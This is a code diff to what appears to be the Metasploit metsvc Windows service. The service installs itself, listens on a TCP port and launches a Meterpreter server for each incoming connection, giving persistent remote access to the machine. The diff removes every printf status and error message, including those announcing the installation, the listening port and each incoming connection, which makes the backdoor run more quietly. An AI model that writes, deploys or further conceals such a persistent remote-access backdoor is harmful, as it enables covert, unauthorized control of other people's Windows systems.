@@ -57,13 +57,11 @@ int start_meterpreter()
     
     if (GetModuleFileName(NULL, path, sizeof(path)) == 0) {
         err = GetLastError();
-        printf("Cannot get module file name (0x%08x)\n", err);
         goto cleanup;
     }
 
     if ((p = strrchr(path, '\\')) == NULL) {
         err = -1;
-        printf("Cannot find directory in module name %s (0x%08x)\n", path, err);
         goto cleanup;
     }
 
@@ -73,7 +71,6 @@ int start_meterpreter()
 
     if (sizeof(path) - strlen(path) < sizeof(METSVC_SERVER)+1) {
         err = -1;
-        printf("Cannot build server filename (0x%08x)\n", err);
         goto cleanup;
     }
     
@@ -86,7 +83,6 @@ int start_meterpreter()
     
 	err = WSAStartup(MAKEWORD(2, 2), &wsa_data);
     if (err != 0) {
-        printf("Cannot initialize Winsock (0x%08x)\n", err);
         goto cleanup;
     }
 
@@ -94,7 +90,6 @@ int start_meterpreter()
 
     if ((sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == INVALID_SOCKET) {
         err = WSAGetLastError();
-        printf("Cannot create socket (0x%08x)\n", err);
         goto cleanup;
     }
 
@@ -108,7 +103,6 @@ int start_meterpreter()
 
     if (bind(sock, (struct sockaddr*)&sockaddr, sizeof(sockaddr)) == SOCKET_ERROR) {
         err = WSAGetLastError();
-        printf("Cannot bind to port %d (0x%08x)\n", PORT, err);
         goto cleanup;
     }
 
@@ -116,11 +110,9 @@ int start_meterpreter()
 
     if (listen(sock, SOMAXCONN) == SOCKET_ERROR) {
         err = WSAGetLastError();
-        printf("Cannot listen for incoming connections (0x%08x)\n", err);
         goto cleanup;
     }
 
-    printf("Meterpreter service listening on port %d\n", PORT);
     fflush(stdout);
 
     // Accept incoming connections
@@ -134,12 +126,9 @@ int start_meterpreter()
         if ((conn = accept(sock, (struct sockaddr*)&peer, &peer_len)) == INVALID_SOCKET) {
             if ((err = WSAGetLastError()) == WSAECONNRESET)
                 continue;
-            printf("Cannot accept an incomming connection (0x%08x)\n", err);
             goto cleanup;
         }
 
-        printf("Received connection from %s\n",
-            inet_ntoa(peer.sin_addr));
         fflush(stdout);
 
         // Build the metsrv server command line
@@ -149,7 +138,6 @@ int start_meterpreter()
 
         if (len < 0 || len == sizeof(cmd)) {
             err = -1;
-            printf("Cannot build the metsrv server command line (0x%08x)\n", err);
             goto cleanup;
         }
         
@@ -167,7 +155,6 @@ int start_meterpreter()
                           NULL, &startup_info, &process_information) == 0)
         {
             err = GetLastError();
-            printf("Cannot start the metsrv server %s (0x%08x)\n", path, err);
             goto cleanup;
         }
 
@@ -204,7 +191,6 @@ VOID WINAPI ServiceCtrlHandler(DWORD fdwControl)
     }
 
     if (SetServiceStatus(hStatus, &status) == 0) {
-        printf("Cannot set service status (0x%08x)\n", GetLastError());
         exit(1);
     }
 
@@ -223,7 +209,6 @@ VOID WINAPI ServiceMain(DWORD dwArgc, LPTSTR* lpszArgv)
     hStatus = RegisterServiceCtrlHandler(SERVICE_NAME, ServiceCtrlHandler);
 
     if (hStatus == 0) {
-        printf("Cannot register service handler (0x%08x)\n", GetLastError());
         exit(1);
     }
 
@@ -238,7 +223,6 @@ VOID WINAPI ServiceMain(DWORD dwArgc, LPTSTR* lpszArgv)
     status.dwWaitHint = 0;
 
     if (SetServiceStatus(hStatus, &status) == 0) {
-        printf("Cannot set service status (0x%08x)\n", GetLastError());
         return;
     }
 
@@ -252,7 +236,6 @@ VOID WINAPI ServiceMain(DWORD dwArgc, LPTSTR* lpszArgv)
         status.dwServiceSpecificExitCode = 0;
 
         if (SetServiceStatus(hStatus, &status) == 0) {
-            printf("Cannot set service status (0x%08x)\n", GetLastError());
         }
     }
 
@@ -274,7 +257,6 @@ BOOL install_service()
     // Get the current module name
 
     if (!GetModuleFileName(NULL, path, MAX_PATH)) {
-        printf("Cannot get module name (0x%08x)\n", GetLastError());
         return FALSE;
     }
 
@@ -284,7 +266,6 @@ BOOL install_service()
     int len = _snprintf(cmd, sizeof(cmd), "\"%s\" service", path);
 
     if (len < 0 || len == sizeof(cmd)) {
-        printf("Cannot build service command line (0x%08x)\n", -1);
         return FALSE;
     }
 
@@ -293,11 +274,9 @@ BOOL install_service()
     hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
 
     if (hSCManager == NULL) {
-        printf("Cannot open service manager (0x%08x)\n", GetLastError());
         return FALSE;
     }
 
-    printf(" * Installing service %s\n", SERVICE_NAME);
     fflush(stdout);
 
     // Create the service
@@ -319,15 +298,12 @@ BOOL install_service()
     );
 
     if (hService == NULL) {
-        printf("Cannot create service (0x%08x)\n", GetLastError());
-
         CloseServiceHandle(hSCManager);
         return FALSE;
     }
 
     // Start the service
 
-    printf(" * Starting service\n");
     fflush(stdout);
     
     char* args[] = { path, "service" };
@@ -336,8 +312,6 @@ BOOL install_service()
         DWORD err = GetLastError();
 
         if (err != ERROR_SERVICE_ALREADY_RUNNING) {
-            printf("Cannot start service %s (0x%08x)\n", SERVICE_NAME, err);
-
             CloseServiceHandle(hService);
             CloseServiceHandle(hSCManager);
             return FALSE;
@@ -349,7 +323,6 @@ BOOL install_service()
     CloseServiceHandle(hService);
     CloseServiceHandle(hSCManager);
 
-    printf("Service %s successfully installed.\n", SERVICE_NAME);
     fflush(stdout);
     
     return TRUE;
@@ -372,7 +345,6 @@ BOOL remove_service()
     hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT);
 
     if (hSCManager == NULL) {
-        printf("Cannot open service manager (0x%08x)\n", GetLastError());
         return FALSE;
     }
 
@@ -381,36 +353,27 @@ BOOL remove_service()
     hService = OpenService(hSCManager, SERVICE_NAME, SERVICE_STOP | DELETE);
 
     if (hService == NULL) {
-        printf("Cannot open service %s (0x%08x)\n", SERVICE_NAME, GetLastError());
 
         CloseServiceHandle(hSCManager);
         return FALSE;
     }
 
     // Stop the service
-
-    printf(" * Stopping service %s\n", SERVICE_NAME);
     fflush(stdout);
     
     if (ControlService(hService, SERVICE_CONTROL_STOP, &status) == 0) {
         err = GetLastError();
 
         if (err != ERROR_SERVICE_NOT_ACTIVE) {
-            printf("Cannot stop service %s (0x%08x)\n", SERVICE_NAME, err);
-
             CloseServiceHandle(hSCManager);
             return FALSE;
         }
     }
 
     // Delete the service
-
-    printf(" * Removing service\n");
     fflush(stdout);
     
     if (DeleteService(hService) == 0) {
-        printf("Cannot delete service %s (0x%08x)\n", SERVICE_NAME);
-        
         CloseServiceHandle(hSCManager);
         return FALSE;
     }
@@ -419,8 +382,7 @@ BOOL remove_service()
 
     CloseServiceHandle(hService);
     CloseServiceHandle(hSCManager);
-
-    printf("Service %s successfully removed.\n", SERVICE_NAME);
+    
     fflush(stdout);
 
     return TRUE;
@@ -440,8 +402,6 @@ void start_service()
     };
 
     if (StartServiceCtrlDispatcher(ServiceTable) == 0) {
-        printf("Cannot start the service control dispatcher (0x%08x)\n",
-            GetLastError());
         exit(1);
     }
 }
